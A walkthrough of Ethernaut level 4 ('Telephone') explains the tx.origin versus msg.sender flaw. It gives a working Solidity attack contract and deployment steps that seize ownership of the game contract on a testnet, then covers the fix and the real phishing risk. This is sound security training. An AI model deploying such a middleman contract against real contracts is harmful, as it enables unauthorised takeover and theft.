# Ethernaut Level 04 -- Telephone

**Game:** Ethernaut by OpenZeppelin
**Level:** 04 -- Telephone
**Category:** Access Control / tx.origin Misuse
**Network:** Sepolia Testnet
**Status:** Completed

---

## Objective

Claim ownership of the contract.

---

## The Vulnerability

The contract uses tx.origin to determine whether to allow an ownership change:

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }

The developer intended this check to restrict ownership changes to a specific caller. The logic is flawed because tx.origin and msg.sender behave differently depending on how a function is called.

tx.origin is always the original external account that initiated the transaction -- a human wallet. It cannot be a contract.

msg.sender is the immediate caller of the current function. When a contract calls another contract, msg.sender is the calling contract's address, not the human wallet that started the chain.

When you call changeOwner() directly from your wallet, tx.origin and msg.sender are both your wallet address -- they are equal, the condition fails, and ownership does not change.

When an attacker contract calls changeOwner() on your behalf:
- tx.origin is your wallet address -- the original initiator
- msg.sender is the attacker contract address -- the immediate caller

They are different. The condition passes and ownership transfers to whoever the attacker contract specifies.

---

## Attack Contract

    interface ITelephone {
        function changeOwner(address _owner) external;
    }

    contract TelephoneAttack {
        ITelephone target;

        constructor(address _target) {
            target = ITelephone(_target);
        }

        function attack() public {
            target.changeOwner(msg.sender);
        }
    }

When the attacker calls attack(), msg.sender inside attack() is the attacker's wallet. That address is passed to changeOwner(). Inside changeOwner(), tx.origin is the attacker's wallet and msg.sender is the TelephoneAttack contract -- they differ, the condition passes, and the attacker's wallet becomes the owner.

---

## Attack Steps

Step 1 -- Deploy TelephoneAttack in Remix with the Telephone instance address as the constructor argument.

Step 2 -- Call attack() and confirm in Rabby.

Step 3 -- Verify ownership transferred:

    await contract.owner()
    // returns player address

Step 4 -- Submit the instance on Ethernaut.

---

## The Fix

Never use tx.origin for authorization. It cannot distinguish between a human calling directly and a human calling through a malicious contract. Any contract that uses tx.origin for access control can be bypassed by a middleman contract.

The correct approach is to use msg.sender:

    function changeOwner(address _owner) public {
        if (msg.sender == authorizedAddress) {
            owner = _owner;
        }
    }

If the goal is to restrict calls to a specific address, check msg.sender against that address directly. If the goal is to prevent contracts from calling a function, a common pattern is:

    require(msg.sender == tx.origin, "no contracts allowed");

This checks that the immediate caller is also the original initiator -- meaning no contract is in the call chain. This has its own tradeoffs but is more explicit than the flawed check in the Telephone contract.

---

## Real World Impact

The tx.origin phishing attack is a documented attack class. A malicious contract can trick a user into calling it -- through a fake token claim, an airdrop, or any other incentive -- and use that call to interact with a victim contract on the user's behalf. If the victim contract uses tx.origin for authorization, the malicious contract bypasses all access control while the user unknowingly authorizes the action.

The Ethereum documentation explicitly warns against using tx.origin for authorization. It has been flagged in multiple real-world audits as a critical vulnerability.

---

## Key Takeaway

tx.origin and msg.sender are not interchangeable. tx.origin is the human at the start of the chain. msg.sender is whoever called you. Using tx.origin for authorization means any contract that a user interacts with can impersonate that user to your contract. Always use msg.sender for access control.

---

## References

- Ethernaut Level 04 -- https://ethernaut.openzeppelin.com/level/4
- Solidity Documentation -- tx.origin
- SWC-115 -- Authorization through tx.origin
- Ethereum Smart Contract Best Practices -- tx.origin
